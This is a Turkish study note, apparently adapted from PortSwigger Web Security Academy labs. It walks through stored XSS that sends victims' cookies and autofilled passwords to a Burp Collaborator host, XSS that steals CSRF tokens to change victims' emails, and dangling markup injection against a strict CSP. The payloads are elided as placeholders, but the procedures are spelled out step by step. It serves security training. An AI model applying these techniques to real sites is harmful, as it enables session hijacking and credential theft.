Akademi platformunun üçüncü taraflara saldırmak için kullanılmasını önlemek amacıyla güvenlik duvarımız, laboratuvarlar ve rastgele external sistemler arasındaki etkileşimleri engeller. Laboratuvarı çözmek için Burp Collaborator'ın varsayılan genel sunucusunu kullanmalısınız.

Bazı kullanıcılar bu laboratuvar için Burp Collaborator gerektirmeyen alternatif bir çözüm olduğunu fark edecektir. Ancak, cookie'yi dışarı sızdırmaktan çok daha az inceliklidir.

1- Burp Suite Professional'ı kullanarak [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) sekmesine gidin.

2- Benzersiz bir Burp Collaborator payload'unu panonuza kopyalamak için “ Copy to clipboard” (Panoya kopyala) seçeneğine tıklayın.

3- Aşağıdaki payload'u Burp Collaborator subdomain'inizi belirtilen yere ekleyerek bir blog yorumunda gönderin:

{{CODE_BLOCK_118}}

4- Bu script, yorumu görüntüleyen herkesin herkese açık Collaborator sunucusundaki subdomain'inize cookie'lerini içeren bir POST request'i göndermesini sağlayacaktır. 

![Pasted image 20250423213720.png](/img/user/resimler/Pasted%20image%2020250423213720.png)

5- Collaborator sekmesine geri dönün ve “`Poll now` ”a tıklayın. Bir HTTP etkileşimi görmelisiniz. Listede herhangi bir etkileşim görmüyorsanız, birkaç saniye bekleyin ve tekrar deneyin.

6- POST body'sinde kurbanın cookie'sinin değerini not alın.

7- Kendi session cookie'nizi Burp Collaborator'da yakaladığınız cookie ile değiştirmek için Burp Proxy veya Burp Repeater kullanarak ana blog sayfasını yeniden yükleyin. Laboratuvarı çözmek için isteği gönderin. Admin kullanıcısının oturumunu başarıyla ele geçirdiğinizi kanıtlamak için aynı cookie'yi `/my-account` isteğinde kullanarak admin kullanıcısının hesap sayfasını yükleyebilirsiniz.

![Pasted image 20250423213740.png](/img/user/resimler/Pasted%20image%2020250423213740.png)

##### Alternatif çözüm

Alternatif olarak, CSRF gerçekleştirmek için XSS'den yararlanarak kurbanın session cookie'sini bir blog yorumu içinde yayınlamasını sağlayacak şekilde saldırıyı uyarlayabilirsiniz. Ancak bu, cookie'yi herkese açık hale getirdiği ve ayrıca saldırının gerçekleştirildiğine dair kanıtları ifşa ettiği için çok daha az inceliklidir.

{{CODE_BLOCK_119}}

----

## Parolaları ele geçirmek için cross-site scripting'den yararlanma

Bugünlerde birçok kullanıcı şifrelerini otomatik olarak dolduran şifre yöneticilerine sahip. Bir parola girişi oluşturarak, otomatik doldurulan parolayı okuyarak ve kendi domaininize göndererek bundan yararlanabilirsiniz. Bu teknik, cookie çalma ile ilgili sorunların çoğunu ortadan kaldırır ve hatta kurbanın aynı şifreyi tekrar kullandığı diğer tüm hesaplara erişim sağlayabilir.

Bu tekniğin birincil dezavantajı, yalnızca otomatik parola doldurma işlemi gerçekleştiren bir parola yöneticisine sahip olan kullanıcılarda işe yaramasıdır. (Elbette, bir kullanıcının kayıtlı bir parolası yoksa, yerinde kimlik avı saldırısı yoluyla parolasını elde etmeye çalışabilirsiniz, ancak bu tam olarak aynı şey değildir).


---

## Laboratuvar: Parolaları ele geçirmek için cross-site scripting'den yararlanma

Bu laboratuvar, blog yorumları fonksiyonunda stored bir XSS güvenlik açığı içerir. Simüle edilmiş bir kurban kullanıcı, gönderildikten sonra tüm yorumları görüntüler. Laboratuvarı çözmek için güvenlik açığından yararlanarak kurbanın kullanıcı adı ve şifresini ele geçirin ve ardından bu kimlik bilgilerini kullanarak kurbanın hesabında oturum açın.

### Not

Akademi platformunun üçüncü taraflara saldırmak için kullanılmasını önlemek amacıyla güvenlik duvarımız, laboratuvarlar ve rastgele harici sistemler arasındaki etkileşimleri engeller. Laboratuvarı çözmek için Burp Collaborator'ın varsayılan public sunucusunu kullanmalısınız.

Bazı kullanıcılar bu laboratuvar için Burp Collaborator gerektirmeyen alternatif bir çözüm olduğunu fark edecektir. Ancak, kimlik bilgilerinin sızdırılmasından çok daha az inceliklidir.

1- Burp Suite Professional'ı kullanarak Collaborator sekmesine gidin.

2- Benzersiz bir Burp Collaborator payload'unu panonuza kopyalamak için “Panoya kopyala ”ya tıklayın.

3- Aşağıdaki payload'u, belirtilen yere Burp Collaborator subdomain'inizi ekleyerek bir blog yorumunda gönderin:

{{CODE_BLOCK_120}}

Bu script, yorumu görüntüleyen herkesin public Collaborator sunucusundaki subdomain'inize kullanıcı adı ve şifresini içeren bir POST isteği göndermesini sağlayacaktır.

4- Collaborator sekmesine geri dönün ve “Poll now ”a tıklayın. Bir HTTP etkileşimi görmelisiniz. Listede herhangi bir etkileşim görmüyorsanız, birkaç saniye bekleyin ve tekrar deneyin.

5- POST body'sindeki kurbanın kullanıcı adı ve şifresinin değerini not edin.

6- Kurban kullanıcı olarak oturum açmak için bilgileri kullanın.

![Pasted image 20250423224003.png](/img/user/resimler/Pasted%20image%2020250423224003.png)


Alternatif çözüm

Alternatif olarak, [CSRF gerçekleştirmek için XSS'den yararlanarak](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf) kurbanın kimlik bilgilerini bir blog yorumunda yayınlamasını sağlamak için saldırıyı uyarlayabilirsiniz. Ancak bu, kullanıcı adı ve parolayı herkese açık hale getirdiği ve ayrıca saldırının gerçekleştirildiğine dair kanıtları ifşa ettiği için çok daha az inceliklidir.


---

## CSRF korumalarını atlamak için cross-site scripting'den yararlanma

XSS, bir saldırganın legal bir kullanıcının bir web sitesinde yapabileceği neredeyse her şeyi yapmasını sağlar. XSS, kurbanın tarayıcısında rastgele JavaScript çalıştırarak, sanki kurban kullanıcıymışsınız gibi çok çeşitli eylemler gerçekleştirmenize olanak tanır. Örneğin, bir kurbanın bir mesaj göndermesini, bir arkadaşlık isteğini kabul etmesini, bir kaynak kodu deposuna bir backdoor açmasını veya bir miktar Bitcoin transfer etmesini sağlayabilirsiniz.

Bazı web siteleri, giriş yapan kullanıcıların şifrelerini yeniden girmeden e-posta adreslerini değiştirmelerine izin verir. Bu sitelerden birinde bir XSS açığı bulduysanız, bu açıktan yararlanarak bir CSRF tokenı çalabilirsiniz. Token ile kurbanın e-posta adresini kontrol ettiğiniz bir adresle değiştirebilirsiniz. Daha sonra hesaba erişim kazanmak için bir parola sıfırlama işlemini tetikleyebilirsiniz.

Bu tür bir exploit, XSS (CSRF token'ını çalmak için) ile CSRF tarafından tipik olarak hedeflenen fonksiyonelliği birleştirir. Geleneksel CSRF, saldırganın kurbanı istek göndermeye teşvik edebildiği ancak yanıtları göremediği “tek yönlü” bir güvenlik açığı iken, XSS “iki yönlü” iletişim sağlar. Bu da saldırganın hem keyfi talepler göndermesini hem de yanıtları okumasını sağlayarak CSRF karşıtı savunmaları atlatan hibrit bir saldırıya yol açar.

### Not

CSRF tokenları XSS'ye karşı etkisizdir çünkü XSS saldırganların token değerlerini doğrudan yanıtlardan okumasına izin verir.

----

## Lab: Exploiting XSS to bypass CSRF defenses

Bu laboratuvar, blog yorumları işlevinde stored bir XSS güvenlik açığı içerir. Laboratuvarı çözmek için, bir CSRF token'ı çalmak için güvenlik açığından yararlanın, daha sonra bunu blog yazısı yorumlarını görüntüleyen birinin e-posta adresini değiştirmek için kullanabilirsiniz.

Aşağıdaki kimlik bilgilerini kullanarak kendi hesabınıza giriş yapabilirsiniz: `wiener:peter`

1- Sağlanan kimlik bilgilerini kullanarak giriş yapın. Kullanıcı hesabı sayfanızda, e-posta adresinizi güncelleme fonksiyonuna dikkat edin.

2- Sayfanın kaynağını görüntülerseniz aşağıdaki bilgileri görürsünüz:

* `email` adında bir parametre ile `/my-account/change-email` adresine bir POST request'i göndermeniz gerekir.

* `token` adlı gizli bir input içinde bir anti-CSRF token'ı var.

Bu, exploit'inizin kullanıcı hesabı sayfasını yüklemesi, CSRF token'ını çıkarması ve ardından kurbanın e-posta adresini değiştirmek için token'ı kullanması gerektiği anlamına gelir.

3- Aşağıdaki payload'u bir blog yorumunda gönderin:

{{CODE_BLOCK_121}}

![Pasted image 20250423224851.png](/img/user/resimler/Pasted%20image%2020250423224851.png)

4- Bu, yorumu görüntüleyen herkesin e-posta adresini `test@test.com` olarak değiştirmek için bir POST isteği göndermesini sağlayacaktır.

----

## Dangling markup injection

Bu bölümde, dangling markup injection'ı, tipik bir exploit'in nasıl çalıştığını ve dangling markup saldırılarının nasıl önleneceğini açıklayacağız.

### Dangling markup injection nedir?

Dangling markup injection, tam bir cross-site scripting saldırısının mümkün olmadığı durumlarda cross-domain veri yakalamaya yönelik bir tekniktir.

Bir uygulamanın saldırgan tarafından kontrol edilebilen verileri yanıtlarına güvenli olmayan bir şekilde yerleştirdiğini varsayalım:

{{CODE_BLOCK_122}}

Ayrıca uygulamanın `>` veya `"` karakterlerini filtrelemediğini veya escape yapmadığını varsayalım. Bir saldırgan, tırnak içine alınmış attribute değerinden ve çevreleyen tag'den çıkmak ve bir HTML context'ine dönmek için aşağıdaki sözdizimini kullanabilir:

{{CODE_BLOCK_123}}

Bu durumda, bir saldırgan doğal olarak XSS gerçekleştirmeye çalışacaktır. Ancak input filtreleri, content security policy ya da diğer engeller nedeniyle normal bir XSS saldırısının mümkün olmadığını varsayalım. Burada, aşağıdaki gibi bir payload kullanarak dangling markup injection saldırısı gerçekleştirmek hala mümkün olabilir:

{{CODE_BLOCK_124}}

Bu payload bir `img` tagı oluşturur ve saldırganın sunucusunda bir URL içeren bir `src` attribute'unun başlangıcını tanımlar. Saldırganın payload'unun `src` attribute'unu kapatmadığına ve “ dangling” olarak bıraktığına dikkat edin. Bir tarayıcı yanıtı çözümlediğinde, attribute'u sonlandırmak için tek bir tırnak işaretiyle karşılaşana kadar ileriye bakacaktır. Bu karaktere kadar olan her şey URL'nin bir parçası olarak kabul edilecek ve URL query string içinde saldırganın sunucusuna gönderilecektir. Yeni satırlar da dahil olmak üzere alfanümerik olmayan tüm karakterler URL ile kodlanacaktır.

Saldırının sonucu, saldırganın enjeksiyon noktasını takiben uygulamanın yanıtının hassas veriler içerebilecek bir kısmını yakalayabilmesidir. Uygulamanın işlevselliğine bağlı olarak, bu CSRF token'larını, e-posta mesajlarını veya finansal verileri içerebilir.

External istek yapan herhangi bir attribute dangling markup için kullanılabilir.

Tüm external request'ler engellendiği için bir sonraki laboratuvarı çözmek zordur. Ancak, verileri depolamanıza ve daha sonra external bir sunucudan almanıza olanak tanıyan belirli tag'ler vardır. Bu laboratuvarı çözmek kullanıcı etkileşimi gerektirebilir.

---

## Laboratuvar: Dangling markup saldırısı ile çok katı CSP tarafından korunan reflected XSS

Bu laboratuvarda, external web sitelerine giden requestleri engelleyen katı bir CSP kullanılmaktadır.

Laboratuvarı çözmek için önce CSP'yi atlayan ve Burp Collaborator kullanarak simüle edilmiş bir kurban kullanıcının CSRF token'ını dışarı sızdıran bir cross-site scripting saldırısı gerçekleştirin. Daha sonra simüle edilen kullanıcının e-posta adresini `hacker@evil-user.net` olarak değiştirmeniz gerekir.

Simüle edilen kullanıcıyı tıklamaya teşvik etmek için vektörünüzü “ Click” kelimesi ile etiketlemelisiniz. Örneğin:

{{CODE_BLOCK_125}}

Aşağıdaki kimlik bilgilerini kullanarak kendi hesabınıza giriş yapabilirsiniz: `wiener:peter`


1- Yukarıda verilen hesabı kullanarak laboratuvarda oturum açın.

2- E-posta değiştir fonksiyonunu inceleyin. E-posta parametresinde bir XSS güvenlik açığı olduğunu gözlemleyin.

3- Collaborator sekmesine gidin.

4- Benzersiz bir Burp Collaborator yükünü panonuza kopyalamak için “Panoya kopyala ”ya tıklatın.

5- Laboratuvara geri dönün, exploit sunucusuna gidin ve aşağıdaki kodu ekleyin, `YOUR-LAB-ID` ve `YOUR-EXPLOIT-SERVER-ID`'yi sırasıyla laboratuvar kimliğiniz ve exploit sunucu kimliğinizle değiştirin ve `YOUR-COLLABORATOR-ID`'yi Burp Collaborator'dan kopyaladığınız payload ile değiştirin.

{{CODE_BLOCK_126}}

6- “`Store`” ve ardından “`Deliver exploit to victim`” seçeneğine tıklayın. Kullanıcı bu kötü amaçlı komut dosyasını içeren web sitesini ziyaret ettiğinde, laboratuvar web sitesinde hala oturum açmış durumdayken “ `Click me`” bağlantısına tıklarsa, tarayıcısı kötü amaçlı web sitenize CSRF token'ını içeren bir istek gönderecektir. Daha sonra Burp Collaborator kullanarak bu CSRF token'ını çalabilirsiniz.

7- Collaborator sekmesine geri dönün ve “ `Poll now`” seçeneğine tıklayın. Listede herhangi bir etkileşim göremiyorsanız, birkaç saniye bekleyin ve tekrar deneyin. Uygulama tarafından başlatılan bir HTTP etkileşimi görmelisiniz. HTTP etkileşimini seçin, istek sekmesine gidin ve kullanıcının CSRF token'ını kopyalayın.

8- Burp'un Intercept özelliği açıkken, laboratuvarın e-posta değiştirme işlevine geri dönün ve e-postayı rastgele bir adresle değiştirmek için bir istek gönderin.

9- Burp'ta, durdurulan talebe gidin ve e-posta parametresinin değerini `hacker@evil-user.net` olarak değiştirin.

10 - İsteğe sağ tıklayın ve context menüsünden “`Engagement tools`” ve ardından “`Generate CSRF PoC`” öğesini seçin. Açılır pencere hem request'i hem de onun tarafından oluşturulan CSRF HTML'sini gösterir. Talepte, CSRF token'ını daha önce kurbandan çaldığınız token ile değiştirin.

11 - “ `Options` ”a tıklayın ve “`Include auto-submit script`” seçeneğinin aktif olduğundan emin olun.

12- CSRF HTML'sini çalınan token'ı içerecek şekilde güncellemek için “ Regenerate” (Yeniden Oluştur) seçeneğine tıklayın, ardından panoya kaydetmek için “Copy HTML” (HTML Kopyala) seçeneğine tıklayın.

13- Request'i drop edin ve intercept özelliğini kapatın.

14- Exploit sunucusuna geri dönün ve CSRF HTML'sini body'ye yapıştırın. Daha önce girdiğimiz script'in üzerine yazabilirsiniz.

15- “Store” ve “Deliver exploit to victim” seçeneklerine tıklayın. Kullanıcının e-postası `hacker@evil-user.net` olarak değiştirilecektir.


Çözümünü yarın yaz .

---

## Dangling markup saldırıları nasıl önlenir

Dangling markup saldırılarını, çıktıdaki verileri kodlayarak ve girişteki girdiyi doğrulayarak, [cross-site scripting'i önlemek](https://portswigger.net/web-security/cross-site-scripting/preventing) için aynı genel savunmaları kullanarak önleyebilirsiniz.

[content security policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) (CSP) kullanarak da bazı dangling markup saldırılarını azaltabilirsiniz. Örneğin, img gibi tag'lerin external kaynakları yüklemesini engelleyen bir politika kullanarak bazı (ama hepsini değil) saldırıları önleyebilirsiniz.

Not

Chrome tarayıcısı, `img` gibi tag'lerin köşeli parantez ve newline gibi ham karakterler içeren URL'leri tanımlamasını engelleyerek dangling markup saldırılarının üstesinden gelmeye karar vermiştir. Bu, saldırıları önleyecektir çünkü aksi takdirde elde edilecek veriler genellikle bu raw karakterleri içerecektir, böylece saldırı engellenir.


## Content security policy

Burada kaldım xxe saldırılarına geçtim ..

